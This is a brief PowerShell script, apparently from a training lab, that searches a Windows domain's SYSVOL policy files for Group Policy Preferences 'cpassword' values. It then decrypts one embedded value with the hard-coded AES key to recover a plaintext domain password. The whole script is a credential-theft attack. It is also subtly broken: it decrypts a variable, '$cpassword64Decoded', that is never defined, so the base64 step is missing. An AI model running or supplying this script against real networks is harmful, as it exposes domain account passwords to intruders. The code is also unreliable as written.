Write-Output "[*] Search Sysvol"
cd c:\ADSH
Get-ChildItem -Path C:\Windows\SYSVOL\sysvol\ADSHClass.com\Policies -recurse |  Select-String -Pattern "cpassword"
$cpassword = "sFWOJZOU7bJICaqvmd+KAEN0o4RcpxxMLWnK7s7zgNR+JiJwoSa+DLU3kAIdXc1WW5NKrIjIe9MIdBuJHvqFgbcNS873bDK2nbQBqpydkjbsPXV0HRPpQ96phie6N9tn4NF3KYyswokkDnj8gvuyZBXqoG94ML8M1Iq7/jhe37eHJiZGyi5IBoPuCfKpurj2"
$AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
[Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
$AesIV = New-Object Byte[]($AesObject.IV.Length)
$AesObject.IV = $AesIV
$AesObject.Key = $AesKey
$DecryptorObject = $AesObject.CreateDecryptor()
Write-Output "[*] Decrypt"
[Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($cpassword64Decoded, 0, $cpassword64Decoded.length)
$decrypted = [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
$decrypted            
Write-Output "[*] Done"